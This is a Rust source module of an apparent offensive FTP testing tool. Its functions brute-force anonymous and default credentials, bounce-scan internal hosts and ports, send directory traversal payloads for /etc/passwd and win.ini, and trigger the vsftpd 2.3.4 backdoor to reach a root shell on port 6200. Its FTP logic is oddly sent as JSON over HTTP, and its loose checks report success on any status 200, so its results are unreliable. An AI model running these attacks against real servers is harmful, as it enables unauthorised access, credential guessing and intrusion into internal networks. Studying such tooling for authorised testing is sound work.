use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn anon(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} FTP Anonymous Access Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({"action": "ftp_login", "host": url, "username": "anonymous", "password": "anonymous@"});
    let resp = client.post(url).json(&body).send().await?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();

    if text.contains("230") || text.contains("logged in") || text.contains("Login successful") || status == 200 {
        println!("  {} Anonymous FTP access granted!", "[!]".red().bold());
        let list_body = serde_json::json!({"action": "ftp_list", "host": url, "path": "/"});
        if let Ok(r) = client.post(url).json(&list_body).send().await {
            let lt = r.text().await.unwrap_or_default();
            println!("  {} Root directory listing:", "[*]".cyan().bold());
            for line in lt.lines().take(20) {
                println!("    {}", line);
            }
        }
    } else {
        println!("  {} Anonymous FTP access denied.", "[-]".green().bold());
    }

    let common_creds = [
        ("ftp", "ftp"), ("ftp", "password"), ("ftpuser", "ftpuser"),
        ("test", "test"), ("admin", "admin"), ("root", "root"),
    ];
    println!("\n  {} Testing common FTP credentials:", "[*]".cyan().bold());
    for (user, pass) in &common_creds {
        let body = serde_json::json!({"action": "ftp_login", "host": url, "username": user, "password": pass});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let t = r.text().await.unwrap_or_default();
                if t.contains("230") || t.contains("logged in") {
                    println!("    {} {:15}:{:15} — LOGIN SUCCESS", "[+]".green().bold(), user, pass);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn bounce(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} FTP Bounce Scan Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} FTP Server: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let internal_targets = [
        ("127.0.0.1:22", "SSH"),
        ("127.0.0.1:80", "HTTP"),
        ("127.0.0.1:443", "HTTPS"),
        ("127.0.0.1:3306", "MySQL"),
        ("127.0.0.1:5432", "PostgreSQL"),
        ("127.0.0.1:6379", "Redis"),
        ("127.0.0.1:8080", "HTTP Alt"),
        ("10.0.0.1:80", "Internal HTTP"),
        ("192.168.1.1:80", "Router"),
        ("192.168.1.1:22", "Router SSH"),
    ];

    for (target, service) in &internal_targets {
        let body = serde_json::json!({"action": "ftp_bounce", "host": url, "target": target});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let open = text.contains("open") || text.contains("connected") || text.contains("200") || (status == 200 && !text.contains("refused"));
                let tag = if open { "OPEN".red().bold().to_string() } else { "closed/filtered".dimmed().to_string() };
                println!("  {} {:25} {} — {}", "*".cyan(), target, service, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), target),
        }
    }

    Ok(())
}

pub async fn traverse(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} FTP Directory Traversal Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Basic traversal", "../../../etc/passwd"),
        ("Double encoding", "..%252f..%252f..%252fetc%252fpasswd"),
        ("Unicode", "..%c0%af..%c0%af..%c0%afetc/passwd"),
        ("Null byte", "../../../etc/passwd%00"),
        ("Dot slash", "./../../etc/passwd"),
        ("Absolute path", "/etc/passwd"),
        ("Windows", "..\\..\\..\\windows\\win.ini"),
    ];

    for (name, path) in &payloads {
        let body = serde_json::json!({"action": "ftp_retr", "host": url, "path": path});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let success = text.contains("root:") || text.contains("[fonts]") || text.contains("extensions") || (status == 200 && !text.contains("550") && !text.contains("error"));
                let tag = if success { "TRAVERSAL SUCCESS".red().bold().to_string() } else { format!("denied (status={})", status) };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn backdoor(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} FTP Backdoor Checker (vsftpd 2.3.4)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({"action": "ftp_login", "host": url, "username": "user:) ", "password": "pass"});
    let resp = client.post(url).json(&body).send().await?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();

    if text.contains("backdoor") || text.contains("6200") || text.contains("root") {
        println!("  {} vsftpd 2.3.4 backdoor TRIGGERED!", "[!]".red().bold());
        println!("  {} Backdoor shell should be on port 6200.", "[!]".red().bold());
    } else if text.contains("331") || text.contains("Password required") {
        println!("  {} Server accepted backdoor username — checking port 6200...", "[*]".yellow().bold());
        let shell_body = serde_json::json!({"action": "connect", "host": url, "port": 6200});
        if let Ok(r) = client.post(url).json(&shell_body).send().await {
            let st = r.text().await.unwrap_or_default();
            if st.contains("root") || st.contains("#") || st.contains("$") {
                println!("  {} Root shell on port 6200!", "[!]".red().bold());
            } else {
                println!("  {} Port 6200 not responding — backdoor may not be present.", "[-]".dimmed());
            }
        }
    } else {
        println!("  {} Server not vulnerable to vsftpd 2.3.4 backdoor.", "[-]".green().bold());
    }

    let other_backdoors = [
        ("ProFTPD 1.3.3c", "Backdoor in FTP command handling"),
        ("Pure-FTPd 1.0.21", "Authentication bypass"),
        ("WU-FTPD 2.6.0", "Globbing DoS and overflow"),
    ];

    println!("\n  {} Other FTP backdoor checks:", "[*]".cyan().bold());
    for (name, desc) in &other_backdoors {
        println!("    {} {} — {}", "*".cyan(), name, desc);
    }

    Ok(())
}
